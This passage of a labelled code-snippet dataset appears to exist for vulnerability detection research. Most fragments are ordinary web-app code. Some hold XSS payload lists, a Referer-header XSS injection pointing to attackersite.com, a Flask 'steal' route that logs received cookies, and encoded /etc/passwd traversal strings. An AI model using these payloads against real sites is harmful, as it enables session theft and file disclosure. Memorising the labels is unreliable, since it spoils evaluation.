\"Time\") and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==", "label": 0}, {"snippet_id": 23665, "code": " EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command", "label": 0}, {"snippet_id": 54185, "code": "(main, text=\"Method:\",background='light sky blue').grid(row=2) Label(main, text=\"Timeout:\",background='light sky blue').grid(row=3) Label(main, text=\"User-Agent:\",background='light sky blue').grid(row=4", "label": 0}, {"snippet_id": 3300, "code": " xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET", "label": 1}, {"snippet_id": 24347, "code": " testsonly -assume servers are running(as per above) and run tests with no setup or cleaning of environment test_spec -when set, specifies test files, classes, cases, etc. See platform doc. default_store", "label": 0}, {"snippet_id": 20617, "code": " url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$'", "label": 0}, {"snippet_id": 44895, "code": " except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_workflow(request): response={'status': -1} try: workflow_json=json.loads", "label": 0}, {"snippet_id": 11482, "code": " import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin", "label": 0}, {"snippet_id": 53774, "code": " import BeautifulSoup import requests class Xss: def main(): user_dork=str(input(\"[Input Dork] >_ \")) req=url.PoolManager() for page in range(4): send=req.request(\"GET\", \"http://www1.search-results.com", "label": 1}, {"snippet_id": 24356, "code": " -when set, specifies test files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests", "label": 0}, {"snippet_id": 31018, "code": ".install_haproxy(slave) \t\t \tif form.getvalue('syn_flood')==\"1\": \t\tfunct.syn_flood_protect(master) \t\tfunct.syn_flood_protect(slave) \t \tos.system(\"cp scripts/%s.\" % script) \t\t \terror=str(funct.upload(master", "label": 0}, {"snippet_id": 42316, "code": " \t\tdoc[\"doctype\"]=self.doctype \t\tfor df in self.meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t\t\tdoc[df.fieldname]=[d.as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor", "label": 0}, {"snippet_id": 26205, "code": " data=self.cleaned_data if not data.get('is_business'): data['company']='' if self.event.settings.invoice_address_required: if data.get('is_business') and not data.get('company'): raise ValidationError(_(", "label": 0}, {"snippet_id": 38761, "code": "\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__ \tdef getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self", "label": 0}, {"snippet_id": 16822, "code": "(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses", "label": 1}, {"snippet_id": 32542, "code": ": def do_GET(self): path=self.path if path.startswith('/chromium/src/+/master'): path=path[len('/chromium/src/+/master'):] full_path=os.path.realpath(os.path.join(self.server.top_level, path[1:])) if not", "label": 0}, {"snippet_id": 32004, "code": "+username+\"))\" \t\tattributes=[ldap_search_field] \t\tresult=l.search_s(ldap_base, ldap.SCOPE_SUBTREE, criteria, attributes) \t\tresults=[entry for dn, entry in result if isinstance(entry, dict)] \t\ttry: \t\t\tprint('[\"", "label": 0}, {"snippet_id": 32730, "code": " _DoRawSourceFile(self, full_path): self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<table class=\"FileContents\">') with open(full_path) as fp: data=fp.read().replace( '&',", "label": 0}, {"snippet_id": 599, "code": "=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'", "label": 0}, {"snippet_id": 45334, "code": "=_('Saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_coordinator(request): response={'status': -1} coordinator_dict=json.loads(request.POST.get('coordinator'", "label": 0}, {"snippet_id": 53576, "code": "'params_form': params_form, 'action': reverse('oozie:editor_submit_bundle', kwargs={'doc_id': bundle.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json", "label": 0}, {"snippet_id": 17292, "code": ", name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ", "label": 0}, {"snippet_id": 22631, "code": " urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*", "label": 0}, {"snippet_id": 14923, "code": "=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"\" With the above test", "label": 0}, {"snippet_id": 46328, "code": ":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}], \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10\"} ], 'is_latest': LATEST.get(), 'engines': get_engines(request.user) }), 'is_owner", "label": 0}, {"snippet_id": 24592, "code": " database cleanup.') print msg else: msg=colorize('green', \"Cleaning up databases...\") print msg sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string", "label": 0}, {"snippet_id": 54183, "code": "(row=1) Label(main, text=\"Method:\",background='light sky blue').grid(row=2) Label(main, text=\"Timeout:\",background='light sky blue').grid(row=3) Label(main, text=\"User-Agent:\",background='light sky blue", "label": 0}, {"snippet_id": 23756, "code": "-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override", "label": 0}, {"snippet_id": 41801, "code": ", key): \t\treturn frappe.db.get_value(self.doctype, self.name, key) \tdef get(self, key=None, filters=None, limit=None, default=None): \t\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter(self.get_all_children", "label": 0}, {"snippet_id": 54201, "code": "=3) Label(main, text=\"User-Agent:\",background='light sky blue').grid(row=4) Label(main, text=\"Payload:\",background='light sky blue').grid(row=5) Label(main, text=\"HTTP Proxy:\",background='light sky blue", "label": 0}, {"snippet_id": 40208, "code": "=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"", "label": 0}, {"snippet_id": 9955, "code": "/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root", "label": 0}, {"snippet_id": 27800, "code": "): status=exception.status values=exception.to_dict() values['params']=self.request.params.dict_of_lists() if status >=400 and status <=499: logging.info(json.dumps(values, cls=JsonEncoder)) del values", "label": 0}, {"snippet_id": 52741, "code": " submit_workflow(request, doc_id): workflow=Workflow(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet", "label": 0}, {"snippet_id": 41107, "code": "=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments", "label": 0}, {"snippet_id": 42499, "code": ".show_unique_validation_message(e) \t\t\t\telse: \t\t\t\t\traise \t\t\telse: \t\t\t\traise \t\tself.set(\"__islocal\", False) \tdef db_update(self): \t\tif self.get(\"__islocal\") or not self.name: \t\t\tself.db_insert() \t\t\treturn", "label": 0}, {"snippet_id": 27816, "code": "(json.dumps(values, cls=JsonEncoder)) del values['traceDump'] else: logging.exception(exception) if helpers.should_render_json( self.request.headers.get('accept', ''), self.response.headers.get('Content", "label": 0}, {"snippet_id": 38048, "code": "\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context", "label": 0}, {"snippet_id": 33345, "code": ".add_interceptor(auth.prpc_interceptor) prpc_server.add_service(api.BuildsApi()) return[ webapp2.Route(r'/internal/cron/buildbucket/expire_build_leases', expiration.CronExpireBuildLeases), webapp2.Route", "label": 0}, {"snippet_id": 19990, "code": " msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install() print 'Forums permissions/roles data has been seeded' except FixtureError: pass if", "label": 0}, {"snippet_id": 38772, "code": ".__dict__ \tdef getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__", "label": 0}, {"snippet_id": 11282, "code": ": self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports", "label": 0}, {"snippet_id": 33201, "code": " build.\"\"\" @auth.public def get(self, build_id): try: build_id=int(build_id) except ValueError as ex: self.response.write(ex.message) self.abort(400) build=model.Build.get_by_id(build_id) can_view=build", "label": 1}, {"snippet_id": 19723, "code": " import os try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"", "label": 0}, {"snippet_id": 50502, "code": ")[0] try: sess=self.sessionhandler.sessions_from_csessid(csessid)[0] sess.sessionhandler.disconnect(sess) except IndexError: self.client_disconnect(csessid) return '\"\"' def render_POST(self, request): ", "label": 0}, {"snippet_id": 23574, "code": " urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns", "label": 0}, {"snippet_id": 51011, "code": " run. Because of this, we'll move to the horrifically designed absolute nightmare format Crontab. Crontab would be half-great if the parameters where named. Get your crontab guru going, this is the only", "label": 0}, {"snippet_id": 47181, "code": " SQLAlchemyError from invenio_records.admin import record_adminview from invenio_records.api import Record def test_admin(app, db): \"\"\"Test flask-admin interace.\"\"\" admin=Admin(app, name=\"Test\") assert 'model", "label": 0}, {"snippet_id": 18477, "code": "+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading", "label": 0}, {"snippet_id": 5565, "code": "'))\"> \"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\", ", "label": 0}, {"snippet_id": 49965, "code": " the webclient. \"\"\" import json import re import time from twisted.web import server, resource from twisted.internet.task import LoopingCall from django.utils.functional import Promise from django.utils", "label": 0}, {"snippet_id": 17613, "code": "\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=", "label": 0}, {"snippet_id": 35304, "code": ".fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent\", \"parenttype\"): \t\t\t\tif not self.get(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname)))) ", "label": 0}, {"snippet_id": 2418, "code": " from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path", "label": 0}, {"snippet_id": 41232, "code": ".form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"')", "label": 1}, {"snippet_id": 19813, "code": " tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when set, check for", "label": 0}, {"snippet_id": 9982, "code": "\"\" import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler", "label": 0}, {"snippet_id": 7065, "code": ", url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=", "label": 0}, {"snippet_id": 41863, "code": "(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__ \tdef getone(self, key, filters=None): \t\treturn", "label": 0}, {"snippet_id": 39718, "code": " \"Dynamic Link\")})): \t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t\tif df.fieldtype==\"Link\": \t\t\t\t\tdoctype=df.options \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field{0}\")", "label": 0}, {"snippet_id": 4815, "code": " ''' _probes=[ \"\"\"'';!--\"<XSS>=&{()}\"\"\", ] _payloads=[ '<q/oncut=open()>', '<svg/onload=eval(name)>', '<img src=x onerror=alert(/xss/)>', \"\"\"<img src=\"javascript:alert('xss');\">\"\"\", \"\"\"<style>@im\\\\port", "label": 0}, {"snippet_id": 2375, "code": " vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or method=", "label": 0}, {"snippet_id": 33877, "code": "\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route", "label": 0}, {"snippet_id": 10484, "code": " ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter=\"1.0-json\" ' '--depth-limit=6 ' ).format( start_urls", "label": 0}, {"snippet_id": 44926, "code": "() except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_workflow(request, doc_id): workflow", "label": 0}, {"snippet_id": 1683, "code": "'res_headers': data['res_headers'], 'res_body': data['res_body'], 'Description': data['Description'], 'remediation': data['remediation']} vul_list.append(all_data) if data['id']: for vul in alerts: if data['id'", "label": 0}, {"snippet_id": 2911, "code": "+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find", "label": 0}, {"snippet_id": 53875, "code": " request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n-----------", "label": 0}, {"snippet_id": 27790, "code": "'type': exception.__class__.__name__ } if isinstance(exception, helpers.EarlyExitException): status=exception.status values=exception.to_dict() values['params']=self.request.params.dict_of_lists() if status", "label": 0}, {"snippet_id": 31941, "code": ".getvalue('group')+\"/\"+form.getvalue('color') \tlists=funct.get_files(dir=list, format=\"lst\") \tfor list in lists: \t\tprint(list) \t\t if form.getvalue('get_ldap_email'): \tusername=form.getvalue('get_ldap_email') ", "label": 0}, {"snippet_id": 5266, "code": "'cite', 'code', 'col', 'colgroup', 'command', 'content', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure", "label": 0}, {"snippet_id": 3937, "code": " referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=", "label": 0}, {"snippet_id": 51362, "code": "=('name', 'account', 'urls') @admin.register(UploadLog) class UploadLogAdmin(ImportExportModelAdmin, admin.ModelAdmin): list_display=('original_filename', 'internal_filename', 'message', 'user', 'upload_date", "label": 1}, {"snippet_id": 17506, "code": " urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if", "label": 0}, {"snippet_id": 25852, "code": " field=forms.DateField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).date() if initial and initial.answer else None, widget=DatePickerWidget(),", "label": 0}, {"snippet_id": 13953, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading", "label": 0}, {"snippet_id": 1764, "code": ") resp.headers[\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route('/', defaults={'page': 'scan.html'}) @app.route('/<page>') def view_dashboard(page): return render_template('{}'.format(page)) app", "label": 0}, {"snippet_id": 44532, "code": "/json\") @check_document_modify_permission() def save_workflow(request): response={'status': -1} workflow=json.loads(request.POST.get('workflow', '{}')) layout=json.loads(request.POST.get('layout', '{}'))", "label": 0}, {"snippet_id": 22127, "code": " from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover", "label": 0}, {"snippet_id": 46256, "code": ": engine=request.GET.get('engine', 'solr') collections=get_engine(request.user, engine).datasets() if not collections and engine=='solr': return no_collections(request) collection=Collection2(user=request", "label": 0}, {"snippet_id": 33733, "code": "\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category", "label": 1}, {"snippet_id": 14731, "code": "._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd", "label": 0}, {"snippet_id": 26503, "code": "%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f", "label": 0}, {"snippet_id": 19326, "code": ", store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name", "label": 0}, {"snippet_id": 39880, "code": "(is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable \t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2): \t\t\t\t\t\tcancelled_links.append((df.fieldname, docname,", "label": 0}, {"snippet_id": 54386, "code": ".grid(row=6, column=1) proxy.current(0) proxy.config(width=30) refresh.grid(row=7, column=1) refresh.current(1) refresh.config(width=30) crawl.grid(row=8, column=1) crawl.current(0) crawl.config(width=30", "label": 0}, {"snippet_id": 6970, "code": "'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"", "label": 0}, {"snippet_id": 15929, "code": ".__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course", "label": 0}, {"snippet_id": 43950, "code": "\"pass filters as: \t\t{\"key\": \"val\", \"key\":[\"!=\", \"val\"], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not", "label": 0}, {"snippet_id": 548, "code": " in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain' in xss_request['Content-Type", "label": 1}, {"snippet_id": 16158, "code": "\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account'), url(r", "label": 0}, {"snippet_id": 4343, "code": " def __init__(self, url=\"\"): \"\"\" url: xss payload url \"\"\" super(XSS, self).__init__() self.url=url @staticmethod def alterTest(self, p=False): return \"<script>alert(/xss/)</script>\" def img(self): return", "label": 1}, {"snippet_id": 23194, "code": "/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups", "label": 0}, {"snippet_id": 44678, "code": " response['properties']=properties response['workflows']=workflows return HttpResponse(json.dumps(response), mimetype=\"application/json\") def _get_workflows(user): return[{ 'name': workflow.name, 'owner':", "label": 0}, {"snippet_id": 15849, "code": "=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[", "label": 0}, {"snippet_id": 35514, "code": "\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name: \t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname))) \t\t\t\t\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable or", "label": 0}, {"snippet_id": 22566, "code": ": urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern", "label": 0}, {"snippet_id": 15368, "code": "' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None) self.save_screenshots=kwargs.get('save_screenshots',", "label": 0}, {"snippet_id": 23617, "code": ".run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name", "label": 0}, {"snippet_id": 53980, "code": " @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: ", "label": 0}, {"snippet_id": 45733, "code": "], param['value']) for param in params_form.cleaned_data]) job_id=_submit_bundle(request, bundle, mapping) request.info(_('Bundle submitted.')) return redirect(reverse('oozie:list_oozie_bundle', kwargs", "label": 0}, {"snippet_id": 1245, "code": ".scanids.insert({\"scanid\": scanid, \"name\": name, \"url\": url}) except: print \"Failed to update DB\" else: msg={\"status\": \"Failed\"} except: msg={\"status\": \"Failed\"} return jsonify(msg) @app.route('/scan/scanids/", "label": 0}, {"snippet_id": 1713, "code": "'name': data['alert'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body'], 'Description': vul['Description'], 'remediation", "label": 0}, {"snippet_id": 27489, "code": "'polymer_tag', lambda v: '{{%s}}' % v) def add_menu(name, href): \"\"\"Add menu item to the main navigation.\"\"\" _MENU_ITEMS.append(_MenuItem(name, href)) def make_login_url(dest_url): \"\"\"Make the switch account", "label": 0}, {"snippet_id": 27652, "code": "-Type-Options']='nosniff' self.response.headers['X-Frame-Options']='deny' def render(self, path, values=None, status=200): \"\"\"Write HTML response.\"\"\" if values is None: values={} values['menu_items']=_MENU_ITEMS", "label": 0}, {"snippet_id": 12505, "code": ".list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(", "label": 0}, {"snippet_id": 46620, "code": ".models import LifeCondition, Benefit, BenefitRequirement class BenefitOverview(TemplateView): template_name='core/benefit_overview.html' def get_context_data(self): data=super().get_context_data() data", "label": 0}, {"snippet_id": 43688, "code": " \t\t\tval=abs(self.get(fieldname)) \t\tif not doc: \t\t\tdoc=getattr(self, \"parent_doc\", None) or self \t\treturn format_value(val, df=df, doc=doc, currency=currency) \tdef is_print_hide(self, fieldname, df=None", "label": 0}, {"snippet_id": 35415, "code": "\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname", "label": 0}, {"snippet_id": 27249, "code": " only!\\n\" if __name__==\"__main__\": banner() if len(sys.argv) !=2: print \"program[url]\" exit() url=sys.argv[1] if url.find(\"http\") !=0: print \"[-] Invalid target\" exit() m=re.match(r'(http|https):\\/\\/([^\\", "label": 1}, {"snippet_id": 23703, "code": "\"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \" \"SELENIUM_DRIVER_LOG_DIR", "label": 0}, {"snippet_id": 14280, "code": " settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'", "label": 0}, {"snippet_id": 14418, "code": ".migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS", "label": 0}, {"snippet_id": 38897, "code": ".append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance", "label": 0}, {"snippet_id": 12582, "code": ")/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views", "label": 0}, {"snippet_id": 29072, "code": "\tprint('error: '+error) \t\t \tos.system(\"rm -f %s\" % script) \tssh_command(serv, commands, print_out=\"1\") \t \tif kwargs.get('syn_flood')==\"1\": \t\tsyn_flood_protect(serv) \t def syn_flood_protect(serv, **kwargs):", "label": 0}, {"snippet_id": 9043, "code": "\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views", "label": 0}, {"snippet_id": 35988, "code": "))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html(value, linkify=df.fieldtype=='Text Editor') \t\t\tself.set(fieldname, sanitized_value) \tdef _save_passwords(self): \t\t'''Save password field values", "label": 0}, {"snippet_id": 4930, "code": "' '<imG/sRc=l oNerrOr=(prompt)() x>', '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>', '<deTails open oNToggle=confi\\u0072m()>', '<img sRc=l oNerrOr=(confirm)() x>', '<svg/x=\">\"/onload=confirm()//',", "label": 0}, {"snippet_id": 27206, "code": ", line, re.M|re.I) if m_action or m_same: has_form=1 form_counter+=1 if m_same: page=\"\" else: page=m_action.group(1) rtype=\"get\" if m_reqtype: rtype=m_reqtype.group(1) print \"[+] Form detected. Method ", "label": 1}, {"snippet_id": 38155, "code": "=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] 